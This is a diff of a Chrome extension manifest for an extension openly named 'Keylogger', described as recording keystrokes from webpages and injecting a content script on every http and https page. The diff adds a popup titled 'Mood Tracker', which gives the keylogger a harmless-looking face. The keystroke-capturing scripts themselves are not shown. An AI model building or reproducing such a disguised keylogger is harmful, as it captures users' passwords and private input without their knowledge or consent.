@@ -1,6 +1,5 @@
 {
 	"manifest_version" : 3,
-
 	"name": "Keylogger",
 	"description" : "Records keystrokes from webpages",	
 	"content_scripts" : [
@@ -8,6 +7,10 @@
 		"matches" : ["http://*/*" , "https://*/*"],
 		"js" : ["content.js"]
 	}],
+	"action":{
+        "default_popup": "index.html",
+        "default_title": "Mood Tracker"
+    },
 	"background": {
 		"service_worker": "background.js",
 		"type": "module"
@@ -26,6 +29,7 @@
         "tabs",
         "storage"
 	]
+	
 }
 
 
